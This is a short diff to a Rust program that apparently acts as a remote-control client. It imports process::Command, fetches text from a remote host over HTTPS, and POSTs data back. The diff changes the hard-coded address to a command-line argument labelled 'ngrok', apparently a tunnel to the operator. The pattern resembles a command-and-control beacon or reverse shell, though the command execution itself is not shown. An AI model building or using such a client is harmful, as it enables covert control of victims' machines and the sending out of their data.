@@ -3,13 +3,16 @@ use std::process::Command;
 use std::str;
 
 static PROTO: &str = "https";
-static IP_ADDR: &str = "0.0.0.0";
+fn addr() -> Vec<String> {
+        env::args().collect()
+}
 static PORT: u32 = 443;
 
 #[tokio::main]
 
 async fn res() -> String{
-    let url = format!("{}://{}:{}", PROTO, IP_ADDR, PORT);
+    let ngrok = addr();
+    let url = format!("{}://{}:{}", PROTO, ngrok[1], PORT);
     match reqwest::get(url).await{
         Ok(_res) =>{
             let res = _res.text().await.unwrap();
@@ -21,7 +24,8 @@ async fn res() -> String{
     }
 }
 fn req(data: &str){
-    let url = format!("{}://{}:{}", PROTO, IP_ADDR, PORT);
+    let ngrok = addr();
+    let url = format!("{}://{}:{}", PROTO, ngrok[1], PORT);
     let body = format!("{}", data);
     let client = reqwest::blocking::Client::new();
     match client.post(url).body(body).send() {
